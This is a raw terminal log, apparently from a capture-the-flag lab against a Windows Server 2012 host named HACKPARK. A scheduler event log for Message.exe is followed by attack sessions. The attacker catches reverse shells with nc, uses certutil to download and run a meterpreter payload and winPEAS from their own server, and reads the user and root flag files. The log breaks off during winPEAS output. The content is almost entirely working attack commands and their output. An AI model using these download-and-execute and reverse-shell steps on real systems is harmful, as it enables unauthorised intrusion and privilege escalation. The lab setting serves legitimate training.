06/07/24 08:42:33,Process Ended. PID:2912,ExitCode:4,Message.exe (Administrator)
06/07/24 08:43:01,Event Started Ok, (Administrator)
06/07/24 08:43:33,Process Ended. PID:2264,ExitCode:4,Message.exe (Administrator)
06/07/24 08:44:01,Event Started Ok, (Administrator)
06/07/24 08:44:33,Process Ended. PID:1916,ExitCode:4,Message.exe (Administrator)
06/07/24 08:45:01,Event Started Ok, (Administrator)
06/07/24 08:45:33,Process Ended. PID:2352,ExitCode:4,Message.exe (Administrator)
06/07/24 08:46:01,Event Started Ok, (Administrator)
06/07/24 08:46:33,Process Ended. PID:516,ExitCode:4,Message.exe (Administrator)
06/07/24 08:47:01,Event Started Ok, (Administrator)
06/07/24 08:47:33,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 08:48:01,Event Started Ok, (Administrator)
06/07/24 08:48:33,Process Ended. PID:1404,ExitCode:4,Message.exe (Administrator)
06/07/24 08:49:01,Event Started Ok, (Administrator)
06/07/24 08:49:33,Process Ended. PID:1192,ExitCode:4,Message.exe (Administrator)
06/07/24 08:50:01,Event Started Ok, (Administrator)
06/07/24 08:50:33,Process Ended. PID:2568,ExitCode:4,Message.exe (Administrator)
06/07/24 08:51:01,Event Started Ok, (Administrator)
06/07/24 08:51:33,Process Ended. PID:2872,ExitCode:4,Message.exe (Administrator)
06/07/24 08:52:01,Event Started Ok, (Administrator)
06/07/24 08:52:33,Process Ended. PID:900,ExitCode:4,Message.exe (Administrator)
06/07/24 08:53:01,Event Started Ok, (Administrator)
06/07/24 08:53:33,Process Ended. PID:1680,ExitCode:4,Message.exe (Administrator)
06/07/24 08:54:01,Event Started Ok, (Administrator)
06/07/24 08:54:33,Process Ended. PID:2884,ExitCode:4,Message.exe (Administrator)
06/07/24 08:55:01,Event Started Ok, (Administrator)
06/07/24 08:55:33,Process Ended. PID:2088,ExitCode:4,Message.exe (Administrator)
06/07/24 08:56:01,Event Started Ok, (Administrator)
06/07/24 08:56:33,Process Ended. PID:1684,ExitCode:4,Message.exe (Administrator)
06/07/24 08:57:01,Event Started Ok, (Administrator)
06/07/24 08:57:33,Process Ended. PID:1952,ExitCode:4,Message.exe (Administrator)
06/07/24 08:58:01,Event Started Ok, (Administrator)
06/07/24 08:58:33,Process Ended. PID:720,ExitCode:4,Message.exe (Administrator)
06/07/24 08:59:01,Event Started Ok, (Administrator)
06/07/24 08:59:33,Process Ended. PID:2000,ExitCode:4,Message.exe (Administrator)
06/07/24 09:00:00,Event Started Ok, (Administrator)
06/07/24 09:00:33,Process Ended. PID:1520,ExitCode:4,Message.exe (Administrator)
06/07/24 09:01:01,Event Started Ok, (Administrator)
06/07/24 09:01:33,Process Ended. PID:1836,ExitCode:4,Message.exe (Administrator)
06/07/24 09:02:01,Event Started Ok, (Administrator)
06/07/24 09:02:33,Process Ended. PID:2344,ExitCode:4,Message.exe (Administrator)
06/07/24 09:03:01,Event Started Ok, (Administrator)
06/07/24 09:03:33,Process Ended. PID:1052,ExitCode:4,Message.exe (Administrator)
06/07/24 09:04:01,Event Started Ok, (Administrator)
06/07/24 09:04:33,Process Ended. PID:3236,ExitCode:4,Message.exe (Administrator)
06/07/24 09:05:01,Event Started Ok, (Administrator)
06/07/24 09:05:33,Process Ended. PID:3492,ExitCode:4,Message.exe (Administrator)
06/07/24 09:06:01,Event Started Ok, (Administrator)
06/07/24 09:06:33,Process Ended. PID:3752,ExitCode:4,Message.exe (Administrator)
06/07/24 09:07:01,Event Started Ok, (Administrator)
06/07/24 09:07:33,Process Ended. PID:3984,ExitCode:4,Message.exe (Administrator)
06/07/24 09:08:01,Event Started Ok, (Administrator)
06/07/24 09:08:33,Process Ended. PID:3152,ExitCode:4,Message.exe (Administrator)
06/07/24 09:09:01,Event Started Ok, (Administrator)
06/07/24 09:09:34,Process Ended. PID:1656,ExitCode:4,Message.exe (Administrator)
06/07/24 09:10:01,Event Started Ok, (Administrator)
06/07/24 09:10:33,Process Ended. PID:3596,ExitCode:4,Message.exe (Administrator)
06/07/24 09:11:02,Event Started Ok, (Administrator)
06/07/24 09:11:34,Process Ended. PID:3548,ExitCode:4,Message.exe (Administrator)
06/07/24 09:12:00,Event Started Ok, (Administrator)
06/07/24 09:12:33,Process Ended. PID:4016,ExitCode:4,Message.exe (Administrator)
06/07/24 09:13:02,Event Started Ok, (Administrator)
06/07/24 09:13:34,Process Ended. PID:2420,ExitCode:4,Message.exe (Administrator)
06/07/24 09:14:01,Event Started Ok, (Administrator)
06/07/24 09:14:33,Process Ended. PID:3632,ExitCode:4,Message.exe (Administrator)
06/07/24 09:15:02,Event Started Ok, (Administrator)
06/07/24 09:15:34,Process Ended. PID:3552,ExitCode:4,Message.exe (Administrator)
06/07/24 09:16:01,Event Started Ok, (Administrator)
06/07/24 09:16:33,Process Ended. PID:4064,ExitCode:4,Message.exe (Administrator)
06/07/24 09:17:02,Event Started Ok, (Administrator)
06/07/24 09:17:34,Process Ended. PID:3136,ExitCode:4,Message.exe (Administrator)
06/07/24 09:18:01,Event Started Ok, (Administrator)
06/07/24 09:18:33,Process Ended. PID:3616,ExitCode:4,Message.exe (Administrator)
06/07/24 09:19:02,Event Started Ok, (Administrator)
06/07/24 09:19:34,Process Ended. PID:3092,ExitCode:4,Message.exe (Administrator)
06/07/24 09:20:01,Event Started Ok, (Administrator)
06/07/24 09:20:33,Process Ended. PID:3792,ExitCode:4,Message.exe (Administrator)
06/07/24 09:21:01,Event Started Ok, (Administrator)
06/07/24 09:21:34,Process Ended. PID:3880,ExitCode:4,Message.exe (Administrator)
06/07/24 09:22:01,Event Started Ok, (Administrator)
06/07/24 09:22:33,Process Ended. PID:3316,ExitCode:4,Message.exe (Administrator)
06/07/24 09:23:01,Event Started Ok, (Administrator)
06/07/24 09:23:33,Process Ended. PID:3672,ExitCode:4,Message.exe (Administrator)
06/07/24 09:24:01,Event Started Ok, (Administrator)
06/07/24 09:24:33,Process Ended. PID:3460,ExitCode:4,Message.exe (Administrator)
06/07/24 09:25:01,Event Started Ok, (Administrator)
06/07/24 09:25:33,Process Ended. PID:3780,ExitCode:4,Message.exe (Administrator)
06/07/24 09:26:00,Event Started Ok, (Administrator)
06/07/24 09:26:33,Process Ended. PID:848,ExitCode:4,Message.exe (Administrator)
06/07/24 09:27:01,Event Started Ok, (Administrator)
06/07/24 09:27:33,Process Ended. PID:3504,ExitCode:4,Message.exe (Administrator)
06/07/24 09:28:01,Event Started Ok, (Administrator)
06/07/24 09:28:33,Process Ended. PID:3892,ExitCode:4,Message.exe (Administrator)
06/07/24 09:29:01,Event Started Ok, (Administrator)
06/07/24 09:29:33,Process Ended. PID:3984,ExitCode:4,Message.exe (Administrator)
06/07/24 09:30:01,Event Started Ok, (Administrator)
06/07/24 09:30:33,Process Ended. PID:3876,ExitCode:4,Message.exe (Administrator)
06/07/24 09:31:01,Event Started Ok, (Administrator)
06/07/24 09:31:33,Process Ended. PID:2568,ExitCode:4,Message.exe (Administrator)
06/07/24 09:32:02,Event Started Ok, (Administrator)
06/07/24 09:32:34,Process Ended. PID:3132,ExitCode:4,Message.exe (Administrator)
06/07/24 09:33:01,Event Started Ok, (Administrator)
06/07/24 09:33:33,Process Ended. PID:3340,ExitCode:4,Message.exe (Administrator)
06/07/24 09:34:01,Event Started Ok, (Administrator)
06/07/24 09:34:33,Process Ended. PID:3392,ExitCode:4,Message.exe (Administrator)
06/07/24 09:35:01,Event Started Ok, (Administrator)
06/07/24 09:35:33,Process Ended. PID:3628,ExitCode:4,Message.exe (Administrator)
06/07/24 09:36:01,Event Started Ok, (Administrator)
06/07/24 09:36:33,Process Ended. PID:3220,ExitCode:4,Message.exe (Administrator)
06/07/24 09:37:02,Event Started Ok, (Administrator)
06/07/24 09:37:34,Process Ended. PID:3704,ExitCode:4,Message.exe (Administrator)
06/07/24 09:38:01,Event Started Ok, (Administrator)
06/07/24 09:38:33,Process Ended. PID:4056,ExitCode:4,Message.exe (Administrator)
06/07/24 09:39:02,Event Started Ok, (Administrator)
06/07/24 09:39:34,Process Ended. PID:3404,ExitCode:4,Message.exe (Administrator)
06/07/24 09:40:01,Event Started Ok, (Administrator)
06/07/24 09:40:33,Process Ended. PID:3112,ExitCode:4,Message.exe (Administrator)
06/07/24 09:41:02,Event Started Ok, (Administrator)
06/07/24 09:41:34,Process Ended. PID:4040,ExitCode:4,Message.exe (Administrator)
06/07/24 09:42:01,Event Started Ok, (Administrator)
06/07/24 09:42:33,Process Ended. PID:3680,ExitCode:4,Message.exe (Administrator)
06/07/24 09:43:01,Event Started Ok, (Administrator)
06/07/24 09:43:33,Process Ended. PID:2972,ExitCode:4,Message.exe (Administrator)
06/07/24 09:44:01,Event Started Ok, (Administrator)
06/07/24 09:44:33,Process Ended. PID:3232,ExitCode:4,Message.exe (Administrator)
06/07/24 09:45:02,Event Started Ok, (Administrator)
06/07/24 09:45:34,Process Ended. PID:3148,ExitCode:4,Message.exe (Administrator)
06/07/24 09:46:00,Event Started Ok, (Administrator)
06/07/24 09:46:33,Process Ended. PID:720,ExitCode:4,Message.exe (Administrator)
06/07/24 09:47:02,Event Started Ok, (Administrator)
06/07/24 09:47:34,Process Ended. PID:2364,ExitCode:4,Message.exe (Administrator)
06/07/24 09:48:01,Event Started Ok, (Administrator)
06/07/24 09:48:33,Process Ended. PID:3440,ExitCode:4,Message.exe (Administrator)
06/07/24 09:49:00,Event Started Ok, (Administrator)
06/07/24 09:49:33,Process Ended. PID:3416,ExitCode:4,Message.exe (Administrator)
06/07/24 09:50:01,Event Started Ok, (Administrator)
06/07/24 09:50:33,Process Ended. PID:3664,ExitCode:4,Message.exe (Administrator)
06/07/24 09:51:01,Event Started Ok, (Administrator)
06/07/24 09:51:33,Process Ended. PID:2704,ExitCode:4,Message.exe (Administrator)
06/07/24 09:52:01,Event Started Ok, (Administrator)
06/07/24 09:52:33,Process Ended. PID:3564,ExitCode:4,Message.exe (Administrator)
06/07/24 09:53:01,Event Started Ok, (Administrator)
06/07/24 09:53:33,Process Ended. PID:2400,ExitCode:4,Message.exe (Administrator)
06/07/24 09:54:00,Event Started Ok, (Administrator)
06/07/24 09:54:33,Process Ended. PID:3128,ExitCode:4,Message.exe (Administrator)
06/07/24 09:55:01,Event Started Ok, (Administrator)
06/07/24 09:55:33,Process Ended. PID:3280,ExitCode:4,Message.exe (Administrator)
06/07/24 09:56:01,Event Started Ok, (Administrator)
06/07/24 09:56:33,Process Ended. PID:3036,ExitCode:4,Message.exe (Administrator)
06/07/24 09:57:01,Event Started Ok, (Administrator)
06/07/24 09:57:33,Process Ended. PID:3512,ExitCode:4,Message.exe (Administrator)
06/07/24 09:58:01,Event Started Ok, (Administrator)
06/07/24 09:58:34,Process Ended. PID:3656,ExitCode:4,Message.exe (Administrator)
06/07/24 09:59:01,Event Started Ok, (Administrator)
06/07/24 09:59:33,Process Ended. PID:4008,ExitCode:4,Message.exe (Administrator)
06/07/24 10:00:01,Event Started Ok, (Administrator)
06/07/24 10:00:33,Process Ended. PID:408,ExitCode:4,Message.exe (Administrator)
06/07/24 10:01:01,Event Started Ok, (Administrator)
06/07/24 10:01:33,Process Ended. PID:1752,ExitCode:4,Message.exe (Administrator)
06/07/24 10:02:01,Event Started Ok, (Administrator)
06/07/24 10:02:33,Process Ended. PID:3464,ExitCode:4,Message.exe (Administrator)
06/07/24 10:03:01,Event Started Ok, (Administrator)
06/07/24 10:03:33,Process Ended. PID:3724,ExitCode:4,Message.exe (Administrator)
06/07/24 10:04:01,Event Started Ok, (Administrator)
06/07/24 10:04:33,Process Ended. PID:3956,ExitCode:4,Message.exe (Administrator)
06/07/24 10:05:01,Event Started Ok, (Administrator)
06/07/24 10:05:33,Process Ended. PID:3692,ExitCode:4,Message.exe (Administrator)
06/07/24 10:06:01,Event Started Ok, (Administrator)
06/07/24 10:06:33,Process Ended. PID:3940,ExitCode:4,Message.exe (Administrator)
06/07/24 10:07:01,Event Started Ok, (Administrator)
06/07/24 10:07:33,Process Ended. PID:3720,ExitCode:4,Message.exe (Administrator)
06/07/24 10:08:01,Event Started Ok, (Administrator)
06/07/24 10:08:33,Process Ended. PID:3620,ExitCode:4,Message.exe (Administrator)
06/07/24 10:09:00,Event Started Ok, (Administrator)
06/07/24 10:09:33,Process Ended. PID:1836,ExitCode:4,Message.exe (Administrator)
06/07/24 10:10:00,Event Started Ok, (Administrator)
06/07/24 10:10:33,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
06/07/24 10:11:01,Event Started Ok, (Administrator)
06/07/24 10:11:33,Process Ended. PID:1292,ExitCode:4,Message.exe (Administrator)
06/07/24 10:12:01,Event Started Ok, (Administrator)
06/07/24 10:12:33,Process Ended. PID:3516,ExitCode:4,Message.exe (Administrator)
06/07/24 10:14:01,Event Started Ok, (Administrator)
06/07/24 10:14:33,Process Ended. PID:3368,ExitCode:4,Message.exe (Administrator)
06/07/24 10:15:01,Event Started Ok, (Administrator)
06/07/24 10:15:33,Process Ended. PID:3120,ExitCode:4,Message.exe (Administrator)
06/07/24 10:16:01,Event Started Ok, (Administrator)
06/07/24 10:16:33,Process Ended. PID:3296,ExitCode:4,Message.exe (Administrator)
06/07/24 10:17:02,Event Started Ok, (Administrator)
06/07/24 10:17:34,Process Ended. PID:2428,ExitCode:4,Message.exe (Administrator)
06/07/24 10:18:01,Event Started Ok, (Administrator)
06/07/24 10:18:33,Process Ended. PID:3464,ExitCode:4,Message.exe (Administrator)
06/07/24 10:19:02,Event Started Ok, (Administrator)
06/07/24 10:19:34,Process Ended. PID:3320,ExitCode:4,Message.exe (Administrator)
06/07/24 10:20:01,Event Started Ok, (Administrator)
06/07/24 10:20:33,Process Ended. PID:1396,ExitCode:4,Message.exe (Administrator)
06/07/24 10:21:02,Event Started Ok, (Administrator)
06/07/24 10:21:34,Process Ended. PID:1848,ExitCode:4,Message.exe (Administrator)
06/07/24 10:22:01,Event Started Ok, (Administrator)
06/07/24 10:22:33,Process Ended. PID:1620,ExitCode:4,Message.exe (Administrator)
06/07/24 10:23:01,Event Started Ok, (Administrator)
06/07/24 10:23:34,Process Ended. PID:3132,ExitCode:4,Message.exe (Administrator)
06/07/24 10:24:01,Event Started Ok, (Administrator)
06/07/24 10:24:32,Process Ended. PID:3608,ExitCode:4,Message.exe (Administrator)
06/07/24 10:25:01,Event Started Ok, (Administrator)
06/07/24 10:25:34,Process Ended. PID:3144,ExitCode:4,Message.exe (Administrator)
06/07/24 10:26:01,Event Started Ok, (Administrator)
06/07/24 10:26:33,Process Ended. PID:3392,ExitCode:4,Message.exe (Administrator)
06/07/24 10:27:02,Event Started Ok, (Administrator)
06/07/24 10:27:34,Process Ended. PID:3076,ExitCode:4,Message.exe (Administrator)
06/07/24 10:28:01,Event Started Ok, (Administrator)
06/07/24 10:28:33,Process Ended. PID:1864,ExitCode:4,Message.exe (Administrator)
06/07/24 10:29:02,Event Started Ok, (Administrator)
06/07/24 10:29:34,Process Ended. PID:1996,ExitCode:4,Message.exe (Administrator)
06/07/24 10:30:01,Event Started Ok, (Administrator)
06/07/24 10:30:33,Process Ended. PID:2568,ExitCode:4,Message.exe (Administrator)
06/07/24 10:31:01,Event Started Ok, (Administrator)
06/07/24 10:31:33,Process Ended. PID:3748,ExitCode:4,Message.exe (Administrator)
06/07/24 10:32:01,Event Started Ok, (Administrator)
06/07/24 10:32:33,Process Ended. PID:3476,ExitCode:4,Message.exe (Administrator)
06/07/24 10:33:01,Event Started Ok, (Administrator)
06/07/24 10:33:33,Process Ended. PID:3792,ExitCode:4,Message.exe (Administrator)
06/07/24 10:34:01,Event Started Ok, (Administrator)
06/07/24 10:34:33,Process Ended. PID:4008,ExitCode:4,Message.exe (Administrator)
06/07/24 10:35:00,Event Started Ok, (Administrator)
06/07/24 10:35:33,Process Ended. PID:408,ExitCode:4,Message.exe (Administrator)
06/07/24 10:36:01,Event Started Ok, (Administrator)
06/07/24 10:36:33,Process Ended. PID:4068,ExitCode:4,Message.exe (Administrator)
06/07/24 10:37:00,Event Started Ok, (Administrator)
06/07/24 10:37:33,Process Ended. PID:3804,ExitCode:4,Message.exe (Administrator)
06/07/24 10:38:01,Event Started Ok, (Administrator)
06/07/24 10:38:33,Process Ended. PID:3856,ExitCode:4,Message.exe (Administrator)
06/07/24 10:39:01,Event Started Ok, (Administrator)
06/07/24 10:39:33,Process Ended. PID:3036,ExitCode:4,Message.exe (Administrator)
06/07/24 10:40:01,Event Started Ok, (Administrator)
06/07/24 10:40:33,Process Ended. PID:3488,ExitCode:4,Message.exe (Administrator)
06/07/24 10:41:01,Event Started Ok, (Administrator)
06/07/24 10:41:33,Process Ended. PID:3136,ExitCode:4,Message.exe (Administrator)
06/07/24 10:42:01,Event Started Ok, (Administrator)
06/07/24 10:42:33,Process Ended. PID:2804,ExitCode:4,Message.exe (Administrator)
06/07/24 10:43:01,Event Started Ok, (Administrator)
06/07/24 10:43:33,Process Ended. PID:3532,ExitCode:4,Message.exe (Administrator)
06/07/24 10:44:01,Event Started Ok, (Administrator)
06/07/24 10:44:33,Process Ended. PID:1936,ExitCode:4,Message.exe (Administrator)
06/07/24 10:45:01,Event Started Ok, (Administrator)
06/07/24 10:45:33,Process Ended. PID:3700,ExitCode:4,Message.exe (Administrator)
06/07/24 10:46:01,Event Started Ok, (Administrator)
06/07/24 10:46:34,Process Ended. PID:3656,ExitCode:4,Message.exe (Administrator)
06/07/24 10:47:01,Event Started Ok, (Administrator)
06/07/24 10:47:33,Process Ended. PID:3676,ExitCode:4,Message.exe (Administrator)
06/07/24 10:48:02,Event Started Ok, (Administrator)
06/07/24 10:48:34,Process Ended. PID:3144,ExitCode:4,Message.exe (Administrator)
06/07/24 10:49:01,Event Started Ok, (Administrator)
06/07/24 10:49:33,Process Ended. PID:3236,ExitCode:4,Message.exe (Administrator)
06/07/24 10:50:01,Event Started Ok, (Administrator)
06/07/24 10:50:34,Process Ended. PID:4008,ExitCode:4,Message.exe (Administrator)
06/07/24 10:51:01,Event Started Ok, (Administrator)
06/07/24 10:51:33,Process Ended. PID:2456,ExitCode:4,Message.exe (Administrator)
06/07/24 10:52:02,Event Started Ok, (Administrator)
06/07/24 10:52:34,Process Ended. PID:3696,ExitCode:4,Message.exe (Administrator)
06/07/24 10:53:01,Event Started Ok, (Administrator)
06/07/24 10:53:33,Process Ended. PID:3612,ExitCode:4,Message.exe (Administrator)
06/07/24 10:54:01,Event Started Ok, (Administrator)
06/07/24 10:54:33,Process Ended. PID:3100,ExitCode:4,Message.exe (Administrator)
06/07/24 10:55:01,Event Started Ok, (Administrator)
06/07/24 10:55:33,Process Ended. PID:1828,ExitCode:4,Message.exe (Administrator)
06/07/24 10:56:01,Event Started Ok, (Administrator)
06/07/24 10:56:33,Process Ended. PID:3232,ExitCode:4,Message.exe (Administrator)
06/07/24 10:57:01,Event Started Ok, (Administrator)
06/07/24 10:57:33,Process Ended. PID:3852,ExitCode:4,Message.exe (Administrator)
06/07/24 10:58:01,Event Started Ok, (Administrator)
06/07/24 10:58:33,Process Ended. PID:3200,ExitCode:4,Message.exe (Administrator)
06/07/24 10:59:01,Event Started Ok, (Administrator)
06/07/24 10:59:33,Process Ended. PID:3856,ExitCode:4,Message.exe (Administrator)
06/07/24 11:00:01,Event Started Ok, (Administrator)
06/07/24 11:00:33,Process Ended. PID:3764,ExitCode:4,Message.exe (Administrator)
06/07/24 11:01:01,Event Started Ok, (Administrator)
06/07/24 11:01:33,Process Ended. PID:3704,ExitCode:4,Message.exe (Administrator)
06/07/24 11:02:01,Event Started Ok, (Administrator)
06/07/24 11:02:33,Process Ended. PID:3136,ExitCode:4,Message.exe (Administrator)
06/07/24 11:03:02,Event Started Ok, (Administrator)
06/07/24 11:03:34,Process Ended. PID:3228,ExitCode:4,Message.exe (Administrator)
06/07/24 11:04:01,Event Started Ok, (Administrator)
06/07/24 11:04:33,Process Ended. PID:852,ExitCode:4,Message.exe (Administrator)
06/07/24 11:05:01,Event Started Ok, (Administrator)
06/07/24 11:05:33,Process Ended. PID:2000,ExitCode:4,Message.exe (Administrator)
06/07/24 11:06:01,Event Started Ok, (Administrator)
06/07/24 11:06:33,Process Ended. PID:3784,ExitCode:4,Message.exe (Administrator)
06/07/24 11:07:02,Event Started Ok, (Administrator)
06/07/24 11:07:34,Process Ended. PID:3168,ExitCode:4,Message.exe (Administrator)
06/07/24 11:08:01,Event Started Ok, (Administrator)
06/07/24 11:08:33,Process Ended. PID:3688,ExitCode:4,Message.exe (Administrator)
06/07/24 11:09:02,Event Started Ok, (Administrator)
06/07/24 11:09:34,Process Ended. PID:3280,ExitCode:4,Message.exe (Administrator)
06/07/24 11:10:01,Event Started Ok, (Administrator)
06/07/24 11:10:33,Process Ended. PID:3692,ExitCode:4,Message.exe (Administrator)
06/07/24 11:11:02,Event Started Ok, (Administrator)
06/07/24 11:11:34,Process Ended. PID:2428,ExitCode:4,Message.exe (Administrator)
06/07/24 11:12:01,Event Started Ok, (Administrator)
06/07/24 11:12:33,Process Ended. PID:3500,ExitCode:4,Message.exe (Administrator)
06/07/24 11:13:02,Event Started Ok, (Administrator)
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.253.222] 49234
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"
c:\windows\system32\inetsrv>certutil -urlcache -split -f "http://10.18.21.236:8000/shells/revsh-meterpr-444.exe" "C:\windows\temp\revsh-meterpr-444.exe"
****  Online  ****
  000000  ...
  01204a
CertUtil: -URLCache command completed successfully.

c:\windows\system32\inetsrv>
C:\windows\temp\revsh-meterpr-444.exe
c:\windows\system32\inetsrv>C:\windows\temp\revsh-meterpr-444.exe
^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.253.222] 49263
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

c:\Program Files (x86)\SystemScheduler>whoami
whoami

c:\Program Files (x86)\SystemScheduler>^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.253.222] 49273
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>whoami
whoami

C:\PROGRA~2\SYSTEM~1>cd c:\users
cd c:\users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users

08/04/2019  11:54 AM    <DIR>          .
08/04/2019  11:54 AM    <DIR>          ..
08/03/2019  11:15 AM    <DIR>          .NET v4.5
08/03/2019  11:15 AM    <DIR>          .NET v4.5 Classic
08/05/2019  02:03 PM    <DIR>          Administrator
08/04/2019  11:54 AM    <DIR>          jeff
08/22/2013  08:39 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  39,131,475,968 bytes free

c:\Users>cd jeff
cd jeff

c:\Users\jeff>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users\jeff

08/04/2019  11:54 AM    <DIR>          .
08/04/2019  11:54 AM    <DIR>          ..
08/04/2019  11:54 AM    <DIR>          Contacts
08/04/2019  11:55 AM    <DIR>          Desktop
08/04/2019  11:54 AM    <DIR>          Documents
08/04/2019  11:54 AM    <DIR>          Downloads
08/04/2019  11:54 AM    <DIR>          Favorites
08/04/2019  11:54 AM    <DIR>          Links
08/04/2019  11:54 AM    <DIR>          Music
08/04/2019  11:54 AM    <DIR>          Pictures
08/04/2019  11:54 AM    <DIR>          Saved Games
08/04/2019  11:54 AM    <DIR>          Searches
08/04/2019  11:54 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  39,131,426,816 bytes free

c:\Users\jeff>cd desktop
cd desktop

c:\Users\jeff\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users\jeff\Desktop

08/04/2019  11:55 AM    <DIR>          .
08/04/2019  11:55 AM    <DIR>          ..
08/04/2019  11:57 AM                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)  39,131,426,816 bytes free

c:\Users\jeff\Desktop>type user.txt
type user.txt
759bd8af507517bcfaede78a21a73e39
c:\Users\jeff\Desktop>^C
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.253.222] 49291
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\PROGRA~2\SYSTEM~1>whoami
whoami

C:\PROGRA~2\SYSTEM~1>cd c:\users
cd c:\users

c:\Users>cd administrators
cd administrators
The system cannot find the path specified.

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users

08/04/2019  11:54 AM    <DIR>          .
08/04/2019  11:54 AM    <DIR>          ..
08/03/2019  11:15 AM    <DIR>          .NET v4.5
08/03/2019  11:15 AM    <DIR>          .NET v4.5 Classic
08/05/2019  02:03 PM    <DIR>          Administrator
08/04/2019  11:54 AM    <DIR>          jeff
08/22/2013  08:39 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  39,131,426,816 bytes free

c:\Users>cd Administrator
cd Administrator

c:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users\Administrator

08/05/2019  02:03 PM    <DIR>          .
08/05/2019  02:03 PM    <DIR>          ..
08/03/2019  10:43 AM    <DIR>          Contacts
08/04/2019  11:49 AM    <DIR>          Desktop
08/03/2019  10:43 AM    <DIR>          Documents
10/02/2020  02:38 PM    <DIR>          Downloads
08/03/2019  10:43 AM    <DIR>          Favorites
08/03/2019  10:43 AM    <DIR>          Links
08/03/2019  10:43 AM    <DIR>          Music
08/03/2019  10:43 AM    <DIR>          Pictures
08/03/2019  10:43 AM    <DIR>          Saved Games
08/03/2019  10:43 AM    <DIR>          Searches
08/03/2019  10:43 AM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  39,131,426,816 bytes free

c:\Users\Administrator>cd desktop
cd desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552

 Directory of c:\Users\Administrator\Desktop

08/04/2019  11:49 AM    <DIR>          .
08/04/2019  11:49 AM    <DIR>          ..
08/04/2019  11:51 AM                32 root.txt
08/04/2019  04:36 AM             1,029 System Scheduler.lnk
               2 File(s)          1,061 bytes
               2 Dir(s)  39,131,426,816 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
c:\Users\Administrator\Desktop>certutil -urlcache -split -f "http://10.18.21.236:8000/enum/winPEAS.bat" "c:\windows\temp\winpeas.bat"
certutil -urlcache -split -f "http://10.18.21.236:8000/enum/winPEAS.bat" "c:\windows\temp\winpeas.bat"
****  Online  ****
  0000  ...
  8d58
CertUtil: -URLCache command completed successfully.

c:\Users\Administrator\Desktop>c:\windows\temp\winpeas.bat
c:\windows\temp\winpeas.bat

            ((,.,/((((((((((((((((((((/,  */
     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                
   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                             
   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                          
   (((((((((((/* ******************/####### .(. ((((((                                                                        
   ((((((..******************/@@@@@/***/###### /((((((                                                                        
   ,,..**********************@@@@@@@@@@(***,#### ../(((((                                                                     
   , ,**********************#@@@@@#@@@@*********##((/ /((((                                                                   
   ..(((##########*********/#@@@@@@@@@/*************,,..((((                                                                  
   .(((################(/******/@@@@@#****************.. /((                                                                  
   .((########################(/************************..*(                                                                  
   .((#############################(/********************.,(                                                                  
   .((##################################(/***************..(                                                                  
   .((######################################(************..(                                                                  
   .((######(,.***.,(###################(..***(/*********..(                                                                  
   .((######*(#####((##################((######/(********..(                                                                  
   .((##################(/**********(################(**...(                                                                  
   .(((####################/*******(###################.((((                                                                  
   .(((((############################################/  /((                                                                   
   ..(((((#########################################(..(((((.                                                                  
   ....(((((#####################################( .((((((.                                                                   
   ......(((((#################################( .(((((((.                                                                    
   (((((((((. ,(############################(../(((((((((.                                                                    
       (((((((((/,  ,####################(/..((((((((((.                                                                      
             (((((((((/,.  ,*//////*,. ./(((((((((((.                                                                         
                (((((((((((((((((((((((((((/                                                                                  
                       by github.com/PEASS-ng                                                                                 
                                                                                                                              
                                                                                                                              
/!\ Advisory: WinPEAS - Windows local Privilege Escalation Awesome Script                                                     
   WinPEAS should be used for authorized penetration testing and/or educational purposes only.                                
   Any misuse of this software will not be the responsibility of the author or of any other collaborator.                     
   Use it at your own networks and/or with the network owner's permission.                                                    
                                                                                                                              
[*] BASIC SYSTEM INFO                                                                                                         
 [+] WINDOWS OS                                                                                                               
   [i] Check for vulnerabilities for the OS version with the applied patches                                                  
   [?] https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#kernel-exploits                       
                                                                                                                              
Host Name:                 HACKPARK                                                                                           
OS Name:                   Microsoft Windows Server 2012 R2 Standard                                                          
OS Version:                6.3.9600 N/A Build 9600                                                                            
OS Manufacturer:           Microsoft Corporation                                                                              
OS Configuration:          Standalone Server                                                                                  
OS Build Type:             Multiprocessor Free                                                                                
Registered Owner:          Windows User                                                                                       
Registered Organization:                                                                                                      
